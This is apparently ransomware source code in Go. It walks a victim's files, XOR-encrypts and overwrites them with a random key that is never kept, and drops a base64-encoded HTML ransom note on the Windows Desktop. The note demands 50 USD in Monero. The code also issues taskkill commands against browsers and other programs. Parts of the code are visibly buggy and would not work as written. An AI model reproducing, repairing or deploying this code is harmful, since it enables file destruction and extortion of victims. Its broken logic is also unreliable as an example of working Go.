package main

import (
	"encoding/base64"
	"github.com/thanhpk/randstr"
	"io/fs"
	"os"
	"os/exec"
	"os/user"
	"path/filepath"
	"strings"
	"time"
)

func main() {
	time.Sleep(48)
	encrypt()
	showmssg()
}

func encrypt() {
	var filesoo []string
	var stored []byte
	var bitwisexor []byte
	var count int
	files := filepath.Walk("", func(path string, info fs.FileInfo, err error) error {
		filesoo = append(filesoo, path)
		return err
	})
	files.Error()
	key := randstr.Bytes(200)
	for i := range filesoo {
		if strings.Contains(filesoo[i], ".sys") || strings.Contains(filesoo[i], ".dll") || strings.Contains(filesoo[i], ".exe") {
			continue
		}
		j, err := os.OpenFile(filesoo[i], os.O_RDONLY, 0755)
		if err != nil {
			return
		}
		_, err999 := j.Read(stored)
		if err999 != nil {
			return
		}
		for k := len(stored); k > 0; k-- {
			if k > len(key) {
				if count > len(key) {
					count = 0
				}
				bitwisexor[k] = stored[k] ^ key[0+count]
				count++
			}
			bitwisexor[k] = stored[k] ^ key[k]
		}
		kkkkkkkkkkkk := j.Close()
		if kkkkkkkkkkkk != nil {
			return
		}
		for ll := len(filesoo[i]); ll > 0; ll-- {
			bbb := os.WriteFile(filesoo[i], bitwisexor, 0755)
			if bbb != nil {
				return
			}
		}
		char := []rune(filesoo[i])
		for name := len(filesoo[i]); name > 0; name--{
			if string(char[name]) == "."{
				//distance := len(filesoo[i]) - name
				//wait iam lazy af....
			}
		}
	}
	for ok := len(bitwisexor) - 1; ok > 0; ok-- {
		err8888 := bitwisexor[ok] == 0
		if err8888 != true {
			return
		}
	}
}

func showmssg() {
	var EncodedMsg = "PCFET0NUWVBFIGh0bWw+CjxodG1sIGxhbmc9ImVuIj4KPGhlYWQ+CiAgICA8bWV0YSBjaGFyc2V0PSJVVEYtOCI+CiAgICA8dGl0bGU+UmVhZC1DYXJlZnVsbHkhPC90aXRsZT4KPC9oZWFkPgo8Ym9keT4KPHA+QWxsIG9mIHlvdXIgaW1wb3J0YW50IGZpbGVzIGhhdmUgYmVlbiBlbmNyeXB0ZWQhClBheSA1MCBVU0QgaW4gbW9uZXJvIGFuZCBnZXQgdGhlIGtleSEKSWYgeW91J3ZlIGp1c3QgY2xvc2VkIHRoZSBwcm9tcHQgd2l0aCB0aGUgY29kZSB0byByZWNlaXZlIHRoZSBiaW5hcnkocHJvZ3JhbSkgdG8gZGVjcnlwdCB5b3VyIGltcG9ydGFudCBmaWxlcyBhZnRlciB5b3UgcGF5ZWQsCkRvbnQndCB3b3JyeSBqdXN0IG9wZW4gaXQgYWdhaW4gZnJvbSB0aGUgZGVza3RvcCBpdCdzIHlvdXIgdW5pcXVlIGlkZW50aWZpeWluZyBudW1iZXIgZG9uJ3QgbG9vc2UgaXQhCmlmIHlvdSBkb24ndCBob3cgdGhlIGdldCBtb25lcm8gaGVyZSB5b3UgZ28hIC0+PC9wPgo8YSBocmVmID0gImh0dHBzOi8vd3d3LmdldG1vbmVyby5vcmcvIiA+PC9hPgo8cD5XaGVuIHlvdSBwYXkgdGhlIDUwJCBsZWF2ZSBhIG5vdGUgd2l0aCB0aGUgdW5pcXVlIGlkZW50aWZ5aW5nIG51bWJlciB5b3UndmUgZ290IGFuZCB5b3VyJ2VtYWlsIHlvdSdsbCBiZSBzZW5kIHRoZSBwcm9ncmFtPC9wPgo8L2JvZHk+CjwvaHRtbD4="
	DecodedMsg, yo := base64.StdEncoding.DecodeString(EncodedMsg)
	if yo != nil {
		return
	}
	file, err55 := os.OpenFile("C:\\Users\\"+getusr()+"\\Desktop\\rnRaNo.html", os.O_RDWR|os.O_CREATE, 0755)
	if err55 != nil {
		return
	}
	_, err := file.WriteString(string(DecodedMsg))
	if err != nil {
		return
	}
	err87 := file.Close()
	if err87 != nil {
		return
	}
	exec.Command("taskkill", "/IM", "chrome.exe")
	exec.Command("taskkill", "/IM", "firefox.exe")
	exec.Command("taskkill", "/IM", "steam.exe")
	exec.Command("taskkill", "/IM", "notepad.exe")
	exec.Command("msedge.exe", "C:\\Users\\"+getusr()+"\\Desktop\\rnRano.html")
}

func getusr() string {
	lambda, err := user.Current()
	if err != nil {
		panic("!")
	}
	username := lambda.Username
	return username
}
